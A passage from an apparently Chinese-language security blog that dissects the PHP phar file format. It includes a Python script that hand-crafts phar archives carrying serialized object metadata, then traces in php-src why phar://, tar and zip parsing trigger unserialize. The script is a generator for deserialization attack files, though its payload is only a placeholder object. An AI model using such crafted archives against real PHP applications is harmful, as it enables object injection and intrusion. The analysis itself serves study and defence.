</tr>
<tr>
<td style="text-align:center">0024h</td>
<td style="text-align:center">0022h</td>
<td style="text-align:center">0028h</td>
<td style="text-align:center">4</td>
<td style="text-align:center">00 00 00 00</td>
<td style="text-align:center">别名长度(因为长度为0，也就没有别名部分)</td>
</tr>
<tr>
<td style="text-align:center">0028h</td>
<td style="text-align:center">0029h</td>
<td style="text-align:center">002ch</td>
<td style="text-align:center">4</td>
<td style="text-align:center">1F 00 00 00</td>
<td style="text-align:center">metadata的长度</td>
</tr>
<tr>
<td style="text-align:center">002Ch</td>
<td style="text-align:center">002Dh</td>
<td style="text-align:center">004Bh</td>
<td style="text-align:center">31</td>
<td style="text-align:center">4F 3A 31 3A 22 65 22 3A 31 3A 7B 73 3A 31 3A 22 61 22 3B 73 3A 34 3A 22 74 65 78 74 22 3B 7D</td>
<td style="text-align:center">metadata的内容(即序列化内容)</td>
</tr>
<tr>
<td style="text-align:center">004Ch</td>
<td style="text-align:center">0041h</td>
<td style="text-align:center">0044h</td>
<td style="text-align:center">4</td>
<td style="text-align:center">05 00 00 00</td>
<td style="text-align:center">归档文件的文件名长度</td>
</tr>
<tr>
<td style="text-align:center">0044h</td>
<td style="text-align:center">0045h</td>
<td style="text-align:center">0054h</td>
<td style="text-align:center">5</td>
<td style="text-align:center">61 2E 74 78 74</td>
<td style="text-align:center">归档文件名</td>
</tr>
<tr>
<td style="text-align:center">0054h</td>
<td style="text-align:center">0055h</td>
<td style="text-align:center">0058h</td>
<td style="text-align:center">4</td>
<td style="text-align:center">02 00 00 00</td>
<td style="text-align:center">归档文件未压缩的大小</td>
</tr>
<tr>
<td style="text-align:center">0058h</td>
<td style="text-align:center">0059h</td>
<td style="text-align:center">005Ch</td>
<td style="text-align:center">4</td>
<td style="text-align:center">BC 4F EE 61</td>
<td style="text-align:center">归档文件的Unix时间戳</td>
</tr>
<tr>
<td style="text-align:center">005Ch</td>
<td style="text-align:center">005Dh</td>
<td style="text-align:center">0060h</td>
<td style="text-align:center">4</td>
<td style="text-align:center">02 00 00 00</td>
<td style="text-align:center">归档文件压缩后的大小(默认应该是不会进行压缩)</td>
</tr>
<tr>
<td style="text-align:center">0060h</td>
<td style="text-align:center">0061h</td>
<td style="text-align:center">0064h</td>
<td style="text-align:center">4</td>
<td style="text-align:center">47 DD DC 79</td>
<td style="text-align:center">未压缩内容的CRC32校验</td>
</tr>
<tr>
<td style="text-align:center">0064h</td>
<td style="text-align:center">0065h</td>
<td style="text-align:center">0068h</td>
<td style="text-align:center">4</td>
<td style="text-align:center">B6 01 00 00</td>
<td style="text-align:center"><strong>Bit-mapped File-specific flags</strong>(这里表示的是归档文件的权限，为666)</td>
</tr>
<tr>
<td style="text-align:center">0068h</td>
<td style="text-align:center">0069h</td>
<td style="text-align:center">006Ch</td>
<td style="text-align:center">4</td>
<td style="text-align:center">1F 00 00 00</td>
<td style="text-align:center">metadata的长度</td>
</tr>
<tr>
<td style="text-align:center">006Ch</td>
<td style="text-align:center">006Dh</td>
<td style="text-align:center">008Bh</td>
<td style="text-align:center">31</td>
<td style="text-align:center">4F 3A 31 3A 22 65 22 3A 31 3A 7B 73 3A 31 3A 22 61 22 3B 73 3A 34 3A 22 74 65 78 74 22 3B 7D</td>
<td style="text-align:center">metadata的内容(即序列化内容)</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><em>Content</em></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">008Bh</td>
<td style="text-align:center">008Ch</td>
<td style="text-align:center">008Dh</td>
<td style="text-align:center">2</td>
<td style="text-align:center">6F 6B</td>
<td style="text-align:center">所有归档文件的内容</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><em>Signature</em></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">008Dh</td>
<td style="text-align:center">008Eh</td>
<td style="text-align:center">00A1h</td>
<td style="text-align:center">20</td>
<td style="text-align:center">30 34 5C A4 CA A8 C8 55 99 1C B8 A7 36 2E 7C 05 D3 49 91 7F</td>
<td style="text-align:center">签名内容(来自0000h - 008Dh内容的sha1值)</td>
</tr>
<tr>
<td style="text-align:center">00A1h</td>
<td style="text-align:center">00A2h</td>
<td style="text-align:center">00A5h</td>
<td style="text-align:center">4</td>
<td style="text-align:center">02 00 00 00</td>
<td style="text-align:center">签名标志(这里表示使用sha1进行签名)</td>
</tr>
<tr>
<td style="text-align:center">00A6h</td>
<td style="text-align:center">00A7h</td>
<td style="text-align:center">00A9h</td>
<td style="text-align:center">4</td>
<td style="text-align:center">47 42 4D 42</td>
<td style="text-align:center">GBMB(表示存在签名)</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>看得出来其实整个 <code>phar</code> 结构也不算难，不用 <code>php</code> 的扩展手撸出 <code>phar</code> 来也是很简单的👇</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> crc32</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5, sha1, sha256, sha512</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PHAR</span>:</span></span><br><span class="line">    <span class="comment"># 一些常量</span></span><br><span class="line">    STUB = <span class="string">b&quot;__HALT_COMPILER(); ?&gt;&quot;</span></span><br><span class="line">    GBMB = <span class="string">b&quot;GBMB&quot;</span></span><br><span class="line">    MD5 = <span class="string">b&quot;\x01\x00\x00\x00&quot;</span></span><br><span class="line">    SHA1 = <span class="string">b&quot;\x02\x00\x00\x00&quot;</span></span><br><span class="line">    SHA256 = <span class="string">b&quot;\x03\x00\x00\x00&quot;</span></span><br><span class="line">    SHA512 = <span class="string">b&quot;\x04\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,</span></span></span><br><span class="line"><span class="params"><span class="function">                 prefix: <span class="built_in">str</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                 manifestData: <span class="built_in">dict</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                 filesData: <span class="built_in">list</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                 signatureType: MD5</span></span></span><br><span class="line"><span class="params"><span class="function">                 </span>):</span></span><br><span class="line">        self.prefix = prefix.encode()</span><br><span class="line">        self.manifestData = manifestData</span><br><span class="line">        self.filesData = filesData</span><br><span class="line">        self.signatureType = signatureType</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查清单的参数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(self.manifestData.get(each) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">for</span> each <span class="keyword">in</span> [<span class="string">&quot;loc&quot;</span>, <span class="string">&quot;metaData&quot;</span>]):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 至少要归档一个文件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.filesData) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 遍历检查文件的参数</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(file.get(each) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">for</span> each <span class="keyword">in</span> [<span class="string">&quot;fileName&quot;</span>, <span class="string">&quot;fileContent&quot;</span>, <span class="string">&quot;loc&quot;</span>, <span class="string">&quot;metaData&quot;</span>]):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将字符串转换字节流</span></span><br><span class="line">        self.manifestData[<span class="string">&quot;metaData&quot;</span>] = self.manifestData[<span class="string">&quot;metaData&quot;</span>].encode()</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> file.items():</span><br><span class="line">                <span class="keyword">if</span> key <span class="keyword">in</span> [<span class="string">&quot;fileName&quot;</span>, <span class="string">&quot;fileContent&quot;</span>, <span class="string">&quot;metaData&quot;</span>]:</span><br><span class="line">                    file[key] = value.encode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查参数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.parse():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        phar = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="comment"># stub</span></span><br><span class="line">        stub = self.stub()</span><br><span class="line">        <span class="comment"># manifest</span></span><br><span class="line">        manifest = self.manifest()</span><br><span class="line">        files = self.file()</span><br><span class="line">        <span class="comment"># content</span></span><br><span class="line">        contents = self.content()</span><br><span class="line">        <span class="comment"># 计算总长度</span></span><br><span class="line">        manifest = pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(manifest + files + contents)) + manifest[<span class="number">4</span>:]</span><br><span class="line">        <span class="comment"># signature</span></span><br><span class="line">        signature = self.signature(stub + manifest + files + contents)</span><br><span class="line">        <span class="comment"># 重新拼接</span></span><br><span class="line">        phar += stub + manifest + files + contents + signature</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> phar</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stub</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.prefix + self.STUB + <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">manifest</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 归档文件数量</span></span><br><span class="line">        manifest = pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(self.filesData))</span><br><span class="line">        <span class="comment"># 版本</span></span><br><span class="line">        manifest += <span class="string">b&quot;\x11\x00&quot;</span></span><br><span class="line">        <span class="comment"># 标识</span></span><br><span class="line">        manifest += <span class="string">b&quot;\x00\x00\x01\x00&quot;</span></span><br><span class="line">        <span class="comment"># 别名长度</span></span><br><span class="line">        manifest += <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果将序列化内容存储于此</span></span><br><span class="line">        <span class="keyword">if</span> self.manifestData[<span class="string">&quot;loc&quot;</span>]:</span><br><span class="line">            <span class="comment"># metadata长度</span></span><br><span class="line">            manifest += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(self.manifestData[<span class="string">&quot;metaData&quot;</span>]))</span><br><span class="line">            <span class="comment"># metadata内容</span></span><br><span class="line">            manifest += self.manifestData[<span class="string">&quot;metaData&quot;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            manifest += pack(<span class="string">&quot;I&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 补足长度</span></span><br><span class="line">        manifest = pack(<span class="string">&quot;I&quot;</span>, <span class="number">0</span>) + manifest</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> manifest</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">file</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        files = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历归档的文件</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            <span class="comment"># 文件名长度</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;fileName&quot;</span>]))</span><br><span class="line">            <span class="comment"># 文件名</span></span><br><span class="line">            files += file[<span class="string">&quot;fileName&quot;</span>]</span><br><span class="line">            <span class="comment"># 未压缩大小</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;fileContent&quot;</span>]))</span><br><span class="line">            <span class="comment"># 时间戳</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">int</span>(time()))</span><br><span class="line">            <span class="comment"># 压缩后大小</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;fileContent&quot;</span>]))</span><br><span class="line">            <span class="comment"># CRC32校验</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, crc32(file[<span class="string">&quot;fileContent&quot;</span>]))</span><br><span class="line">            <span class="comment"># 文件权限</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="number">0o666</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果将序列化内容存储于此</span></span><br><span class="line">            <span class="keyword">if</span> file[<span class="string">&quot;loc&quot;</span>]:</span><br><span class="line">                <span class="comment"># metadata长度</span></span><br><span class="line">                files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;metaData&quot;</span>]))</span><br><span class="line">                <span class="comment"># metadata内容</span></span><br><span class="line">                files += file[<span class="string">&quot;metaData&quot;</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                files += pack(<span class="string">&quot;I&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> files</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">content</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        contents = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历所有归档文件</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            contents += file[<span class="string">&quot;fileContent&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> contents</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">signature</span>(<span class="params">self, content</span>):</span></span><br><span class="line"></span><br><span class="line">        signature = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 签名内容</span></span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.MD5:</span><br><span class="line">            signature = md5(content).digest()</span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.SHA1:</span><br><span class="line">            signature = sha1(content).digest()</span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.SHA256:</span><br><span class="line">            signature = sha256(content).digest()</span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.SHA512:</span><br><span class="line">            signature = sha512(content).digest()</span><br><span class="line">        <span class="comment"># 签名标志</span></span><br><span class="line">        signature += self.signatureType</span><br><span class="line">        <span class="comment"># GBMB标志</span></span><br><span class="line">        signature += self.GBMB</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> signature</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pharData = &#123;</span><br><span class="line">        <span class="string">&quot;prefix&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">        <span class="string">&quot;manifestData&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;loc&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;metaData&quot;</span>: <span class="string">&quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;filesData&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;fileName&quot;</span>: <span class="string">&quot;e.txt&quot;</span>,</span><br><span class="line">                <span class="string">&quot;fileContent&quot;</span>: <span class="string">&quot;dsadawada&quot;</span>,</span><br><span class="line">                <span class="string">&quot;loc&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;metaData&quot;</span>: <span class="string">&quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;fileName&quot;</span>: <span class="string">&quot;c.txt&quot;</span>,</span><br><span class="line">                <span class="string">&quot;fileContent&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">                <span class="string">&quot;loc&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;metaData&quot;</span>: <span class="string">&quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;signatureType&quot;</span>: PHAR.SHA1,</span><br><span class="line">    &#125;</span><br><span class="line">    p = PHAR(**pharData).generate()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.phar&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(p)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>另外，如果在 <code>manifest</code> 和 <code>file</code> 都写入 <code>metadata</code> 内容可以触发多次 <code>反序列化</code> ，不过把序列化内容包装成数组也其实也是是一样效果，没啥必要。至于归档多个文件，由于多个文件要传入的参数比较复杂，就没继续往下写了。</p>
<h2 id="反序列化原因">- 反序列化原因 -</h2>
<p>从上面的 <code>phar</code> 格式已经可以很清楚地知道了 <code>metadata</code> 的内容实际上为序列化数据，那么 <code>metadata</code> 数据的去向也就尤为关键。这里以 <code>php7.4.25</code> 的源码进行分析，先看对 <code>php</code> 的 <code>unserialize</code> 函数的实现👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201241930171.png" alt="image-20220124193046030"></p>
<p>整个流程主要是先是声明了 <code>php_unserialize_data_t</code> 类型的变量 <code>var_hash</code> 然后对其进行初始化，再调用 <code>php_var_unserialize</code> 函数进行 <code>反序列化</code> 。因此 <code>php_unserialize_data_t</code> 类型变量的生成以及 <code>php_var_unserialize</code> 函数的调用也就即为关键。</p>
<p>不妨再来看 <code>phar.c</code> 文件中的 <code>phar_parse_metadata</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201241926373.png" alt="image-20220124192612244"></p>
<p>可以看到这里依然声明了 <code>php_unserialize_data_t</code> 类型的变量 <code>var_hash</code> ，并在对其初始化好后调用了 <code>php_var_unserialize</code> 函数对传入的 <code>metadata</code> 内容进行反序列化，而 <code>metadata</code> 内容刚好也就是包装在 <code>phar</code> 文件中的序列化内容。由此可以简单地看作，当 <code>phar_parse_metadata</code> 函数被调用时也就意味着对 <code>metadata</code> 的内容进行 <code>反序列化</code> 。</p>
<p>而在 <code>phar.c</code> 文件中存在 <code>phar_parse_pharfile</code> 函数，当进行 <code>phar://</code> 协议时就会调用 <code>phar_parse_pharfile</code> 函数对文件内容进行解析；恰好在 <code>phar_parse_pharfile</code> 中还会调用 <code>phar_parse_metadata</code> 函数对 <code>metadata</code> 的内容进行解析，因而也就能够触发 <code>反序列化</code> 了👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201241952853.png" alt="image-20220124195236737"></p>
<h2 id="扩展">- 扩展 -</h2>
<p>当然，上面所展示的仅是 <code>phar_parse_pharfile</code> 函数中对 <code>phar_parse_metadata</code> 的调用，其实在其他地方还是有对 <code>phar_parse_metadata</code> 调用的，按照因果关系，既然存在对 <code>phar_parse_metadata</code> 的调用，也就有可能存在 <code>反序列化</code> 。</p>
<h3 id="分析">- 分析 -</h3>
<p>通过全局搜索可以得到以下函数调用了 <code>phar_parse_metadata</code> 👇</p>
<ul>
<li><code>phar.c -&gt; phar_parse_pharfile</code></li>
<li><code>zip.c -&gt; phar_parse_zipfile</code></li>
<li><code>tar.c -&gt; phar_tar_process_metadata</code></li>
<li><code>util.c -&gt; phar_copy_cached_phar</code></li>
<li><code>phar_object.c -&gt; PHP_METHOD(Phar, getMetadata)</code></li>
<li><code>phar_object.c -&gt; PHP_METHOD(PharFileInfo, getMetadata)</code></li>
</ul>
<p>其中 <code>util.c</code> 文件的 <code>phar_copy_cached_phar</code> 函数在源码中并没有显式地被调用；而 <code>phar_Object.c</code> 文件中的 <code>PHP_METHOD(Phar, getMetadata)</code> 以及 <code>PHP_METHOD(PharFileInfo, getMetadata)</code> 函数虽说即是对应 <code>php</code> 中的 <code>Phar::getMetadata</code> 和 <code>PharFileInfo::getMetadata</code> ，但这两个都受到 <code>phar-&gt;archive-&gt;is_persistent</code> 这个条件的影响👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201242133895.png" alt="image-20220124213351785"></p>
<p>不能通过直接调用 <code>getMetadata</code> 方法的方式触发，另外好像对 <code>phar_parse_metadata</code> 的调用是将返回值作为反序列化的参数，这个不太懂，望懂的伙伴们可以教教额。</p>
<p>因此这里就从 <code>zip.c</code> 的 <code>phar_parse_zipfile</code> 函数和 <code>tar.c</code> 文件的 <code>phar_tar_process_metadata</code> 函数来看。</p>
<p>首先是 <code>phar_parse_zipfile</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201242140993.png" alt="image-20220124214002853"></p>
<p>可以看到是存在对 <code>phar_parse_metadata</code> 函数的调用，其次是 <code>phar_tar_process_metadata</code> 函数👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201242142017.png" alt="image-20220124214256845"></p>
<p>显然 <code>phar_tar_process_metadata</code> 函数是存在对 <code>phar_parse_metadata</code> 函数的调用的，同时 <code>phar_tar_process_metadata</code> 函数由 <code>phar_parse_tarfile</code> 调用，那么就可以看作是 <code>phar_parse_tarfile</code> 函数可以通过 <code>phar_tar_process_metadata</code> 函数去调用 <code>phar_parse_tarfile</code> 函数。</p>
<p>由于在上面的 <code>phar</code> 格式已经提到，<code>phar</code> 的归档格式除了 <code>phar</code> 外还可以有 <code>phar.gz</code> 、<code>phar.bz2</code> 、 <code>tar</code> 和 <code>zip</code> ，也就是说能够触发 <code>反序列化</code> 的不一定只有 <code>phar</code> 的归档格式(即以 <code>__HALT_COMPILER(); ?&gt;</code> 作为 <code>stub</code> )，还可以是 <code>gz</code> 、 <code>bz2</code> 、<code>tar</code> 和 <code>zip</code> 文件。</p>
<p>不妨来到 <code>phar</code> 有关对文件内容格式解析的 <code>phar_open_from_fp</code> 函数，这个函数在 <code>phar.c</code> 文件中👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201242155486.png" alt="image-20220124215520329"></p>
<p>可以看到在变量声明的部分直接定义了 <code>phar</code> 的 <code>stub</code> 和其他 <code>压缩头部</code> 的常量👇</p>
<ul>
<li><code>const char token[] = &quot;__HALT_COMPILER();&quot;;</code></li>
<li><code>const char zip_magic[] = &quot;PK\x03\x04&quot;;</code></li>
<li><code>const char gz_magic[] = &quot;\x1f\x8b\x08&quot;;</code></li>
<li><code>const char bz_magic[] = &quot;BZh&quot;;</code></li>
</ul>
<p>并且声明了一个 <code>buffer</code> 去循环读取文件内容，注意这里的 <code>test</code> 变量值为 <code>\0</code> ，接着往下看👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201242203693.png" alt="image-20220124220306547"></p>
